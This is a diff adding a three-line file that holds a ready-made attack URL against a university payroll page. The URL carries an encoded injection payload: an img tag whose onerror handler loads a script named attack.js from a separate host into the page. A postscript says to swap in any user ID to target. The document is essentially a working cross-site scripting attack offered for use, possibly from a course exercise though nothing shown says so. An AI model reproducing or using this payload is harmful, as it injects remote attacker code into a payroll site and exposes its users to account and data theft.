@@ -1,0 +1,3 @@
+http://payroll.utexas.edu/account.php?eid=hand12345%27;--\%22%3Cimg%20src=%22x%22%20onerror=%22var%20code=document.createElement%28%27script%27%29;code.src=%27https://webspace.utexas.edu/xc2388/attack.js%27;document.getElementById%28%27eid-name%27%29.appendChild%28code%29;%22%3E%3C/img%3E%3Cp%20src=%22
+
+P.S. Change hand12345 to any uteid you want to check
